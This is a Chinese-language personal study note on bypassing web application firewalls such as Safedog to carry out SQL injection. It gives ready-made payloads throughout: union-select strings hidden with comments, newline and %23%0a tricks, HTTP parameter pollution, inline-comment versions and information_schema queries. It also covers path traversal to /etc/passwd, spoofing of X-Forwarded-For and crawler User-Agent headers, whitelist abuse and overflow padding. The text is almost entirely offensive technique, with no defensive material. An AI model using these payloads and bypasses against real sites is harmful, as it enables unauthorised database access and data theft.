WAF其实就是一个规则字典，只要用户输入的内容在字典中被正则匹配出来，就会触发相应的规则和操作，阻止相关请求。

![在这里插入图片描述](D:\BaiduNetdiskDownload\安全\SQL注入\WAF绕过\WAF绕过_SQL注入.assets\i=20210101113431398.png)

# Web应用里的HTTP参数污染（HPP）漏洞

下面这个表简单列举了一些常见的Web服务器对同样名称的参数出现多次的处理方式：

| **Web服务器**    | **参数获取函数**            | **获取到的参数**             |
| ---------------- | --------------------------- | ---------------------------- |
| PHP/Apache       | $_GET(“par”)                | Last                         |
| JSP/Tomcat       | Request.getParameter(“par”) | First                        |
| Perl(CGI)/Apache | Param(“par”)                | First                        |
| Python/Apache    | getvalue(“par”)             | All (List)                   |
| ASP/IIS          | Request.QueryString(“par”)  | All (comma-delimited string) |

 

那么这会有什么问题吗？实际上这本身并没有什么问题，但是前提是Web应用程序的开发者知道这个事情并且有正确的进行处理。否则的话那么难免会对攻击者造成可乘之机。如果对同样名称的参数出现多次的情况没有进行正确处理的话，那么可能会导致漏洞使得攻击者能够利用来发起对服务器端或客户端的攻击。

更改提交方式，比如把get请求的数据换成post请求来提交，如果对方不支持POST请求提交的方式，那么也会注入失败。

https://www.bilibili.com/video/BV1JZ4y1c7ro?p=17&spm_id_from=pageDriver

特殊符号绕过

```
/**/ 是MySQL数据库中的注释
select databases/**/();
?id=-1 union%23a%0Aselect 1, 2, 3;%23
%23是#，在MySQL中是注视符号
```

安全狗（WAF）在匹配时，遇到union%23（#），则认为匹配结束，留下union，而换行符在ASCII码是0xA，也就是上面的%0A，用来将#号后面的内容闭合掉，如果不加%0A，那么select和后面的语句都会被当作是注释的内容被注释掉。

## HTTP参数污染

```
?id=1/**&id=-1%20union%20select%201,2,3%23#*/
```

如果是后台是通过PHP/Apache进行搭建的，那么，就会接收最后一个值当作参数,在数据库中其实就是

```
select * from users where id=-1 union select 1, 2, 3#*/
?id=1/**select * from users*/;
```

## HTTP参数污染

| HTTP后台                                  | 解析结果     |
| ----------------------------------------- | ------------ |
| ASP.NET/IIS                               | 所有的值     |
| PHP/Apache                                | 最后一个值   |
| JSP,Servlet/Apache,Tomcat                 | 第一个值     |
| JSP,Servlet/Oracle Application Server 10g | 第一个值     |
| JSP,Servlet/Jetty                         | 第一个值     |
| IBM Lotus Domino                          | 最后一个值   |
| IBM HTTP Server                           | 第一个值     |
| Perl( CGI)/Apache                         | 第一个值     |
| Python/Apache                             | 变成一个数组 |

## FUZZ大法

在绕过的时候，可以尝试对`%0A`进行变种，比如变成`%0B`、`%0C`以及`%0DDDDDDD`等。不断进行尝试，判断哪种可以绕过安全狗（WAF）。

[Web渗透测试Fuzz字典分享](https://cloud.tencent.com/developer/article/1480929)

### IP白名单绕过

查看网站的IP的地址，然后提交请求的时候，伪造成网站的IP地址进行访问，网站肯定不会屏蔽来自于自己的IP的请求。

### 静态资源绕过

特定的静态资源后缀请求，常见的静态文件（.js .jpg .swf .css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。

```
http://127.0.0.1/info.php?id=1
http://127.0.0.1/info.php/1.txt/?d=1
```

> Aspx/php只识别到前面的.aspx/.php，后面基本不识别。

### url白名单

为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：

```
http://127.0.0.1/info.php/admin.php/?id=1
http://127.0.0.1/info.php?a=/manager/&b=../etc/passwd
http://127.0.0.1/../../manager/../sql.asp?id=2
```

### 爬虫白名单

部分waf有提供爬虫白名单功能，识别爬虫的技术一般有两种：

- UserAgent
- 通过行为来判断

UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。

比如在请求时，可以设置为百度的请求头，WAF就会认为这是从百度搜索引擎过来的请求，于是放行。

User Agent Swithch（FireFox附加组件），下载地址：https://addons.mozilla.org/en-US/firefox/addn/user-agent-switcher

### 其他注入语句

```
/*!50001 select * from user*/;
%20union%20/*!44509select*/%201,2,3
%20/*!44509union*/%230aselect%201, 2, 3
%20union%20all%23%0a%20select*/%201,2,3%23
```

### python脚本

![img](D:\BaiduNetdiskDownload\安全\SQL注入\WAF绕过\WAF绕过_SQL注入.assets\20210504224750.png)

安全狗部分拦截规则

![img](D:\BaiduNetdiskDownload\安全\SQL注入\WAF绕过\WAF绕过_SQL注入.assets\20210504225001.png)

![img](D:\BaiduNetdiskDownload\安全\SQL注入\WAF绕过\WAF绕过_SQL注入.assets\20210504225040.png)

http agent：https://www.feiniaomy.com/post/429.html

### 其他注入方式，中转注入

SQLMAP读取本地脚本——>>本地搭建脚本（请求数据包自定义编写）——>>访问远程地址

```sql
#应用层
大小写/关键字替换
id=1 UnIoN/**/SeLeCT 1,user()
Hex() bin() 等价于ascii()
Sleep() 等价于 benchmark()
Mid()substring() 等价于 substr()
@@user 等价于 User()
@@Version 等价于 version()
各种编码
大小写，URL，hex，%0A等
注释使用
// -- --+ # /**/ + :%00 /!**/等
再次循环(双写绕过)
union==uunionnion
等价替换
user()=@@user() and=& or=| ascii=hex等
参数污染（搜一下相关博客）
?id=1&id=2&id=3

编码解码及加密解密
s->%73->%25%37%33
hex,unlcode,base64等

更改请求提交方式
GET POST COOKIE等
POST->multipart/form-data

中间件HPP参数污染

#数据库特性
1、Mysql技巧
（1）mysql注释符有三种：#、/*...*/、--  ... 
(注意--后面有一个空格)
（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]
（3）特殊符号：%a 换行符
   可结合注释符使用%23%0a，%2d%2d%0a。
（3）内联注释：
   /*!UnIon12345SelEcT*/ 1,user()   
   //数字范围 1000-50540
（4）mysql黑魔法
   select{x username}from {x11 test.admin};

2、SQL Server技巧
（1）用来注释掉注射后查询的其余部分：
    /*      C语言风格注释
    --      SQL注释
    ; 00％ 空字节
（2）空白符：[0x01-0x20]
（3）特殊符号：%3a 冒号
     id=1 union:select 1,2 from:admin
（4）函数变形：如db_name[空白字符]()

3、Oracle技巧
（1）注释符：--、/**/
（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]

4.配合FUZZ
select * from admin where id=1【位置一】union【位置二】
select【位置三】1,2,db_name()【位置四】from【位置五】admin

#逻辑层
1、逻辑问题
（1）云waf防护，一般我们会尝试通过查找站点的真实IP，
从而绕过CDN防护。
（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了
GET请求的有害参数输入,可尝试Bypass。
（3）HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳
转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。
（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，
无法获取到后面的有害参数输入，从而导致Bypass。
比如：id=1%00and 1=2 union select 1,2,column_name 
from information_schema.columns

2、性能问题
猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定
层级，不检测这部分数据。只要不断的填充数据，当数据达到一定
数目之后，恶意代码就不会被检测了。

猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，
因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，
从而实现绕过。

例子1：
?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT
+1,2,version(),4,5,database(),user(),8,9
PS：0xA*1000指0xA后面”A"重复1000次，一般来说对应用软件
构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许
在有些情况下可能不需要这么长也能溢出。

例子2：
?a0=0&a1=1&.....&a100=100&id=1 union select 
1,schema_name,3 from INFORMATION_SCHEMA.schemata
备注：获取请求参数，只获取前100个参数，第101个参数并没有
获取到，导致SQL注入绕过。

3、白名单
方式一：IP白名单
从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，
这样就可能存在伪造IP绕过的情况。
测试方法：修改http的header来bypass waf
X-forwarded-for
X-remote-IP
X-originating-IP
x-remote-addr
X-Real-ip

方式二：静态资源
特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf 
.css等等)，类似白名单机制，waf为了检测效率，不去检测这样
一些静态文件名后缀的请求。
http://10.9.9.201/sql.php?id=1
http://10.9.9.201/sql.php/1.js?id=1
备注：Aspx/php只识别到前面的.aspx/.php 后面基本不识别

方式三：url白名单
为了防止误拦，部分waf内置默认的白名单列表，如
admin/manager/system等管理后台。
只要url中存在白名单的字符串，就作为白名单不进行检测。

常见的url构造姿势：

http://10.9.9.201/sql.php/admin.php?id=1
http://10.9.9.201/sql.php?a=/manage/&b=../etc/passwd
http://10.9.9.201/../../../manage/../sql.asp?id=2
waf通过/manage/“进行比较，只要uri中存在/manage/就作为
白名单不进行检测，这样我们可以通过
/sql.php?a=/manage/&b=../etc/passwd 绕过防御规则。

方式四：爬虫白名单
部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：
1、 根据UserAgent  2、通过行为来判断
UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。
User Agent Switcher (Firefox 附加组件)，下载地址:
https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/
```